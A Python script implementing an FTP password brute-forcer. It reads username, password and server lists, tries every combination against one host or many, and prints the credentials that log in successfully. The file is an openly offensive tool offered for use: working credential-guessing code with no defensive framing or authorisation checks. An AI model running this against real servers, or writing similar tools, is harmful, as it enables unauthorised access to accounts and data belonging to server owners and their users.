import ftplib
import os
import threading

class Cracker:
    def __init__(self , port : int = 21 , path_file : str = "password.txt" , server : str = None , path_list_server : str = None , path_list_username : str = "username.txt") -> None:
        self.password_file = path_file 
        self.username_file = path_list_username
        self.path_file_servers = path_list_server
        self.server = server
        self.port = port
    def read_passwords(self) -> list:
        with open(self.password_file , 'r') as file:
            self.passwords = file.read().split('\n')
            file.close()
        return self.passwords
    
    def read_usernames(self) -> list:
        with open(self.username_file ,'r') as file:
            self.usernames = file.read().split('\n')
            file.close()

        return self.usernames
    
    def read_ftp_servers(self) -> list:
        with open(self.path_file_servers , 'r') as file:
            self.ftp_servers = file.read().split('\n')
            file.close()
        return self.ftp_servers
        
    def main(self):
        self.ftp = ftplib.FTP()
        if self.path_file_servers != None and self.server == None:
            ftp_servers = self.read_ftp_servers()
        else:
            ftp_servers = [self.server]

        for ftp in ftp_servers:
            if ftp:
                for username in self.read_usernames():
                    if username:
                        for passwd in self.read_passwords():
                            if passwd:
                                try:
                                    ready = self.ftp.connect(host=ftp , port=self.port)
                                except:
                                    ready = "error" 
                                if 'ready' in ready:
                                    try:
                                        login = self.ftp.login(user=username , passwd=passwd)
                                    except:
                                        login = 'error'
                                    if 'logged' in login:            
                                        self.ftp.close()
                                        print(f"\n+-------------+\nFtp Server {ftp} Username : {username} , password {passwd}\n+-------------+")                                        
                                    print(f'Checked User ({username}) and password ({passwd}) From Host ({ftp})' , end='\r')                

if __name__ == "__main__":
    path_file_password = input("Enter The Path Of Password list : ")
    path_file_username = input("Enter The Path Of Username List : ")
    ftp_server = input('Enter The Ip Address Ftp Server (If U Want use list ftp server Enter To Next): ')
    if not ftp_server:
        ftp_server = None
        path_file_ftp_servers = input("Enter The Path Of File Ftp Servers : ")
    else:
        path_file_ftp_servers = None
        
    app = Cracker(path_file=path_file_password , path_list_username=path_file_username, server=ftp_server , path_list_server=path_file_ftp_servers)
    app.main()
        
        
        
        
                         
